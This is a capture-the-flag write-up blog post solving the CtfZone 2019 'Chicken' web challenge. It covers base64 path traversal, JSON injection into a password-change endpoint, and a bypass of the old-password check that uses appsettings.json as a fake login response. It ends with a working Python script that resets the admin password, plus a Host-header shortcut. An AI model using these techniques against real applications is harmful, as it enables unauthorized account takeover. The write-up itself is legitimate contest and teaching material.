@@ -1,0 +1,180 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>CtfZone 2019 Quals - Chicken WriteUp · babush.me</title><meta name=description content=" Time to try to put together a writeup of a challenge I think only us of mhackeroni solved. Given that there were only a few reversing challenges, I put on my web-guy hat and …"><link rel=canonical href=https://www.babush.me/ctfzone-2019-quals-chicken-writeup.html><link rel=icon href=/favicon.ico><meta property="og:title" content="CtfZone 2019 Quals - Chicken WriteUp"><meta property="og:description" content=" Time to try to put together a writeup of a challenge I think only us of mhackeroni solved. Given that there were only a few reversing challenges, I put on my web-guy hat and …"><meta property="og:url" content="https://www.babush.me/ctfzone-2019-quals-chicken-writeup.html"><meta property="og:type" content="article"><meta property="og:site_name" content="babush.me"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.babush.me/images/covers/ctfzone-bitconnect.jpg"><meta property="og:image:alt" content="Cover image for “CtfZone 2019 Quals - Chicken WriteUp”"><meta property="article:published_time" content="2019-12-13T02:00:00+01:00"><meta property="article:author" content="Paolo Montesel"><meta property="article:section" content="CTF"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.babush.me/images/covers/ctfzone-bitconnect.jpg"><meta name=twitter:site content="@pmontesel"><meta name=twitter:creator content="@pmontesel"><link rel=alternate type=application/rss+xml title=babush.me href=https://www.babush.me/index.xml><link rel=stylesheet href=/css/site.min.7ad14addf03a23abcbda3cbeb8f68a01e124f9d14984a63382e1ca78f2ac0cd9.css integrity="sha256-etFK3fA6I6vL2jy+uPaKAeEk+dFJhKYzguHKePKsDNk="></head><body><a class=skip href=#main>Skip to content</a><header class=masthead><canvas id=lattice aria-hidden=true></canvas><div class=masthead-inner><p class=wordmark><a href=/>babush.me</a></p><p class=tagline>$ hack; muzak; cat /dev/random</p></div></header><nav class=mainnav aria-label=Main><ul><li><a href=/>Home</a></li><li><a href=/posts/index.html>Archive</a></li><li><a href=/about/>About</a></li></ul></nav><main id=main><article class=post><div class=shell><header class=post-header><p class=meta><time datetime=2019-12-13>Dec 13, 2019</time>
+· <a href=/categories/ctf/>CTF</a>
+· 7 min read</p><h1>CtfZone 2019 Quals - Chicken WriteUp</h1></header><div class=post-main><nav class=toc aria-label="Table of contents"><p>Contents</p><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#the-quest-for-the-main-dll>The Quest For The Main DLL</a></li><li><a href=#the-code>The Code</a></li><li><a href=#the-attack-plan>The Attack Plan</a></li><li><a href=#the-unexpected-behavior>The Unexpected Behavior</a></li><li><a href=#the-script>The Script</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></nav><div class=post-body><p><figure><img src=/images/covers/ctfzone-bitconnect.jpg alt=CTFFFFFFFFF loading=lazy decoding=async></figure></p><p>Time to try to put together a writeup of a challenge I think only us of
+<a href=https://mhackeroni.it/>mhackeroni</a> solved.
+Given that there were only a few reversing challenges, I put on my web-guy hat and
+started going down the rabbit hole.</p><p><strong>Spoiler alert:</strong> I will explain not only the solution, but also my discovery
+process, which I think is way more interesting than a pre-cooked meal.</p><h2 id=introduction>Introduction</h2><p>When we opened <a href=http://web-chicken.ctfz.one/>http://web-chicken.ctfz.one/</a>, we
+were presented with a nice website about chickens and stuff.</p><p>First thing we noticed is that there were some juicy
+<code>/File/Download?filename=&lt;base64></code> urls around, which totally looked sketchy.
+Turns out the base64 string is the encoded path of the file to download.</p><p>So yep, just like that, we had path traversal and could read whatever we wanted
+from the server.</p><h2 id=the-quest-for-the-main-dll>The Quest For The Main DLL</h2><p>This app looked very enterprise-level, so we knew it was written in dotnet (actually, just
+look at the HTML and it&rsquo;s clear).
+For whatever reason, russian CTF organizers really love dotnet stuff on linux.</p><p>About dotnet&mldr;
+Every compiled project has a <code>ProjectName.dll</code> file in its main
+directory, but we couldn&rsquo;t guess that name.</p><p>And so it was time to turn to Google san.</p><p>We opened a new tab, wrote <code>dotnet web project structure</code> or something like that
+and looked at the pictures.
+We could see some interesting files in the directory trees in the image search.
+Unfortunately, none of the files we downloaded contained the app name.
+Not even <code>appsettings.json</code>.</p><p>Sad.</p><p>Eventually our eyes fell on <code>./Views/_ViewImports.cshtml</code>, a nice file that
+started with <code>@using StackHenneryMVCAppProject</code>.</p><p>Yep, totally guessable, <code>StackHenneryMVCAppProject</code>.</p><p>And so, by the powers of the path traversal, we downloaded
+<code>StackHenneryMVCAppProject.dll</code> and loaded it in
+<a href=https://github.com/icsharpcode/ILSpy>ILSpy</a>.</p><h2 id=the-code>The Code</h2><p>The code of the app is actually pretty small.
+At first, we looked at the crypto but it looked fine to my reverser&rsquo;s eyes.</p><p>Second, we looked at the network configuration.
+The challenge was made out of 3 servers:</p><ol><li>The main website we saw so far</li><li>An authentication server in the internal network of the challenge</li><li>A configuration server in the internal network of the challenge</li></ol><p>After poking around with the API for a bit, we kinda knew that the most
+promising place to look at was the <code>Change_Password_Test</code> function of the
+<code>AuthController</code>.</p><p><strong>Protip:</strong> <code>_test</code> looks very enterprise and so it&rsquo;s likely to be broken.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=na>[HttpPost]</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>async</span> <span class=n>Task</span><span class=p>&lt;</span><span class=n>IActionResult</span><span class=p>&gt;</span> <span class=n>Change_Password_Test</span><span class=p>(</span><span class=kt>string</span> <span class=n>username</span><span class=p>,</span> <span class=kt>string</span> <span class=n>new_password</span><span class=p>,</span> <span class=kt>string</span> <span class=n>old_password</span><span class=p>,</span> <span class=kt>string</span> <span class=n>base_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>Configuration</span> <span class=n>conf</span> <span class=p>=</span> <span class=n>Configuration</span><span class=p>.</span><span class=n>getSingleton</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>base_url</span> <span class=p>==</span> <span class=kc>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>base_url</span> <span class=p>=</span> <span class=s>&#34;http://&#34;</span> <span class=p>+</span> <span class=n>conf</span><span class=p>.</span><span class=n>auth_server</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>HttpClient</span> <span class=n>client</span> <span class=p>=</span> <span class=k>new</span> <span class=n>HttpClient</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=kt>string</span> <span class=n>try_login_request</span> <span class=p>=</span> <span class=s>$&#34;{{\&#34;</span><span class=n>username</span><span class=err>\</span><span class=s>&#34;:\&#34;{username}\&#34;,\&#34;password\&#34;:\&#34;{old_password}\&#34;,\&#34;secret_token\&#34;:\&#34;{conf.secret_token}\&#34;}}&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>string</span> <span class=n>url</span> <span class=p>=</span> <span class=n>base_url</span> <span class=p>+</span> <span class=s>&#34;/auth/login&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>StringContent</span> <span class=n>request2</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringContent</span><span class=p>(</span><span class=n>try_login_request</span><span class=p>,</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>UTF8</span><span class=p>,</span> <span class=s>&#34;application/json&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>HttpResponseMessage</span> <span class=n>response</span> <span class=p>=</span> <span class=k>await</span> <span class=n>client</span><span class=p>.</span><span class=n>PostAsync</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>request2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>response</span><span class=p>.</span><span class=n>StatusCode</span> <span class=p>!=</span> <span class=n>HttpStatusCode</span><span class=p>.</span><span class=n>OK</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>base</span><span class=p>.</span><span class=n>ViewBag</span><span class=p>.</span><span class=n>Error</span> <span class=p>=</span> <span class=s>&#34;Bad request&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>View</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>LoginResponse</span> <span class=n>resp</span> <span class=p>=</span> <span class=n>JsonConvert</span><span class=p>.</span><span class=n>DeserializeObject</span><span class=p>&lt;</span><span class=n>LoginResponse</span><span class=p>&gt;(</span><span class=k>await</span> <span class=n>response</span><span class=p>.</span><span class=n>Content</span><span class=p>.</span><span class=n>ReadAsStringAsync</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>resp</span><span class=p>.</span><span class=n>code</span> <span class=p>!=</span> <span class=m>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>base</span><span class=p>.</span><span class=n>ViewBag</span><span class=p>.</span><span class=n>Error</span> <span class=p>=</span> <span class=s>&#34;Invalid login/password&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>View</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=kt>string</span> <span class=n>change_password_request</span> <span class=p>=</span> <span class=s>$&#34;{{\&#34;</span><span class=n>username</span><span class=err>\</span><span class=s>&#34;:\&#34;{username}\&#34;,\&#34;new_password\&#34;:\&#34;{new_password}\&#34;,\&#34;secret_token\&#34;:\&#34;{conf.secret_token}\&#34;}} &#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>string</span> <span class=n>change_pass_url</span> <span class=p>=</span> <span class=s>&#34;http://&#34;</span> <span class=p>+</span> <span class=n>conf</span><span class=p>.</span><span class=n>auth_server</span> <span class=p>+</span> <span class=s>&#34;/auth/change_password&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>request2</span> <span class=p>=</span> <span class=k>new</span> <span class=n>StringContent</span><span class=p>(</span><span class=n>change_password_request</span><span class=p>,</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>UTF8</span><span class=p>,</span> <span class=s>&#34;application/json&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>await</span> <span class=n>client</span><span class=p>.</span><span class=n>PutAsync</span><span class=p>(</span><span class=n>change_pass_url</span><span class=p>,</span> <span class=n>request2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>Content</span><span class=p>(</span><span class=s>&#34;Password changed&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Alright alright alright, what do we have here?</p><p>First thing is that we control all of the parameters to this method of course
+(they are simply the parameters of our POST request).</p><p>Secondly, that this method makes 2 requests:</p><ol><li>POST to <code>base_url + "/auth/login"</code> to check the given current password</li><li>PUT to <code>http://auth_server/auth/change_password</code></li></ol><p>Ok, to be honest, we overlooked the fact that the second request was a PUT and
+not a POST.
+That made us waste a lot of time as we couldn&rsquo;t understand why our exploit
+wasn&rsquo;t working as intended.</p><p>Anyway, you can easily see that <code>try_login_request</code> is a string concatenation
+and so we can inject whatever we want in that json
+(e.g.: <code>'old_password': '{}","new_password":"{}'</code>).</p><p>Overall, <code>Change_Password_Test</code> suffers from
+a classical mistake when checking and changing a password: the request
+is done in two separate phases and the password change doesn&rsquo;t actually check
+for the current password.</p><h2 id=the-attack-plan>The Attack Plan</h2><p>Our attack plan was pretty clear: with some web magic, we wanted to bypass the
+first request (the password check) and reach the second one (the password
+change).</p><p>In order to find a way to do it, we started looking at how the first request&rsquo;s
+response is checked:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>response</span><span class=p>.</span><span class=n>StatusCode</span> <span class=p>!=</span> <span class=n>HttpStatusCode</span><span class=p>.</span><span class=n>OK</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>base</span><span class=p>.</span><span class=n>ViewBag</span><span class=p>.</span><span class=n>Error</span> <span class=p>=</span> <span class=s>&#34;Bad request&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>View</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>LoginResponse</span> <span class=n>resp</span> <span class=p>=</span> <span class=n>JsonConvert</span><span class=p>.</span><span class=n>DeserializeObject</span><span class=p>&lt;</span><span class=n>LoginResponse</span><span class=p>&gt;(</span><span class=k>await</span> <span class=n>response</span><span class=p>.</span><span class=n>Content</span><span class=p>.</span><span class=n>ReadAsStringAsync</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>resp</span><span class=p>.</span><span class=n>code</span> <span class=p>!=</span> <span class=m>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>base</span><span class=p>.</span><span class=n>ViewBag</span><span class=p>.</span><span class=n>Error</span> <span class=p>=</span> <span class=s>&#34;Invalid login/password&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>View</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span></code></pre></div><p>So we needed some URL that returned HTTP 200 and a valid json with the data
+for a <code>LoginResponse</code> object.</p><p>Let&rsquo;s look at its code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=kd>public</span> <span class=k>class</span> <span class=nc>LoginResponse</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=kt>int</span> <span class=n>code</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>get</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>set</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=kt>string</span> <span class=n>message</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>get</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>set</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=kt>string</span> <span class=n>token</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>get</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>set</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>See anything interesting here?</p><p>No <code>[Required]</code> annotations.</p><p>This means that every json is going to be successfully deserialized into an empty
+<code>LoginResponse</code> object, thus setting <code>code=0</code>, thus bypassing the password
+check.
+Unused attributes in the json file are just going to be ignored by the
+deserialization.</p><p>Now, since we didn&rsquo;t see that the second request was a PUT, we spent <strong>a lot</strong>
+of time trying different things and they didn&rsquo;t work.</p><p>At some point, we decided it was a good idea to recreate the challenge
+environment locally.
+And so we did :)
+We made a script that downloaded the DLLs/views/etc one file at a time using the
+path traversal vuln.
+We also stubbed the auth and configuration server using a simple flask-based
+app.
+It was kind of working (there were some configuration errors that broke the view
+rendering), and we finally noticed that the request was indeed a PUT.</p><p>This is what you get when you do CTFs instead of going to sleep.</p><p>Anyway, we were really proud of our script that used <code>dotnet</code> to run the app,
+logged its execution and used some regexps to download all the files that were
+missing.</p><p>Back on track.</p><p>It looks like everything we needed now was an URL that returned a valid json file,
+so that <code>LoginResponse</code> was going to be deserialized with <code>.code = 0</code>.</p><p>This is one of the things we were most proud of: we decided to use the path
+traversal itself as <code>baseUrl</code> for the password change, and we pointed the base64
+path to a json on the filesystem.</p><p>What json file? None other than <code>appsettings.json</code>, the dotnet configuration
+file.</p><p>See what we did there? :) Binary guys chaining vulns.</p><h2 id=the-unexpected-behavior>The Unexpected Behavior</h2><p>At this point we had an exploit that was working but not really.</p><p>The webserver was giving us all the right responses but we still couldn&rsquo;t login.</p><p>This is when we asked the organizers for confirmation that the admin username
+was indeed <code>admin</code>.
+We got a nice <code>we can't tell you that</code> reply.
+Not the nicest organizers out there :) but another org confirmed the user was
+<code>admin</code>.</p><p>After some more guessing, I thought <em>well&mldr; they wouldn&rsquo;t be so <strong>nice</strong> as to
+put some password strength verification on a CTF challenge&mldr; right? &mldr;right?</em>.</p><p>My ass.</p><p>The only reason our exploit was failing now, was that the challenge was checking
+that the new password had at least one uppercase character and a number.</p><p>Yeah.</p><p>First time in my CTF <em>career</em>.</p><h2 id=the-script>The Script</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>USERNAME</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>PASSWORD</span> <span class=o>=</span> <span class=s1>&#39;TotallyWasntASwear123&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1>&#34;,&#34;new_password&#34;:&#34;</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>PASSWORD</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Change the password</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;http://web-chicken.ctfz.one/Auth/Change_Password_Test&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>USERNAME</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;old_password&#39;</span><span class=p>:</span> <span class=s1>&#39;</span><span class=si>{}</span><span class=s1>&#34;,&#34;new_password&#34;:&#34;</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>PASSWORD</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;new_password&#39;</span><span class=p>:</span> <span class=s1>&#39;</span><span class=si>{}</span><span class=s1>&#34;,&#34;asd&#34;:&#34;lol&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>PASSWORD</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;base_url&#39;</span><span class=p>:</span> <span class=s1>&#39;http://web-chicken.ctfz.one/File/Download?filename=</span><span class=si>{}</span><span class=s1>&amp;asd&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/app/appsettings.json&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># For the sake of it</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://web-chicken.ctfz.one/Auth/Login&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Login and get the flag</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;http://web-chicken.ctfz.one/Auth/Login&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;returnUrl&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>USERNAME</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=n>PASSWORD</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Print the flag</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></div><h2 id=conclusion>Conclusion</h2><p>Now for the funny part. Here&rsquo;s a message from the organizers to some people
+asking for a solution on Telegram:</p><p><figure><img src=/images/20191213-ctfzone-chicken.png alt=Telegram loading=lazy decoding=async></figure></p><p>&mldr;so it looks like our solution was&mldr; unintended?</p><p>The actual solution was to&mldr; guess the additional
+<code>http://web-chicken-auth/auth/password_recovery</code>
+URL and pass the admin email (which was written on the website)?</p><p>We will never know.</p><p>Up until that point I was like &ldquo;this challenge had some random things like the
+password strength check, but overall it was actually tricky in a smart way&rdquo;.</p><p>Now, if that&rsquo;s the <em>proper</em> solution, I don&rsquo;t really know what to think anymore.</p><p>But there you have it, your boy managed to use his bad web skills to actually do
+some good and bring 500 points home in what seemed like the only solve to this
+challenge :)</p><p>Cheers,</p><p><em>babush</em></p><p>P.S.: During a good chunk of this challenge I had
+<a href=https://jinblack.it/>jinblack</a> by my side, so GG to him too.</p><p><strong>Update:</strong> Apparently there was a simpler solution.
+The web-chicken-auth server was exposed to the outside by the reverse-proxy in
+front of it. By putting <code>Host: web-chicken-auth</code> in my requests I would have
+avoided the need of writing this entire blog post.</p></div></div><nav class=postnav><div><a href=/code2vec-tldr.html><span class="dir meta">← Previous</span>code2vec TL;DR</a></div><div class=next><a href=/my-greatest-hack-how-i-flew-over-the-dodos-nest.html><span class="dir meta">Next →</span>My Greatest Hack: How I Flew Over The Dodo's Nest</a></div></nav></div></article></main><footer class=sitefoot><div class=shell><ul class=social><li><a href=https://github.com/thebabush/><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63.0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577.0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.305-5.467-1.334-5.467-5.931.0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176.0.0 1.008-.322 3.301 1.23A11.5 11.5.0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221.0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222.0 1.606-.014 2.898-.014 3.293.0.322.216.694.825.576C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+<span>GitHub</span></a></li><li><a href=https://www.linkedin.com/in/paolomontesel/><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601.0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433A2.062 2.062.0 013.274 5.368a2.064 2.064.0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.225.0z"/></svg>
+<span>LinkedIn</span></a></li><li><a href=https://twitter.com/pmontesel><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+<span>Twitter</span></a></li><li><a href=https://www.babush.me/index.xml><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6.503 20.752C6.503 22.546 5.047 24 3.252 24 1.456 24 0 22.546.0 20.752s1.456-3.248 3.252-3.248c1.795.001 3.251 1.454 3.251 3.248zM0 8.18v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817C15.777 15.29 8.721 8.242.0 8.18zm0-3.368C10.58 4.858 19.152 13.406 19.183 24H24C23.97 10.769 13.245.046.0.0z"/></svg>
+<span>RSS</span></a></li></ul><p>&copy; 2026 Paolo Montesel</p></div></footer><script src=/js/main.528aa6ae4ee209942ca7166f11d76d7161714b2aaaa19a49019d997c0e9822ce.js integrity="sha256-Uoqmrk7iCZQspxZvEddtcWFxSyqqoZpJAZ2ZfA6YIs4=" defer></script></body></html>
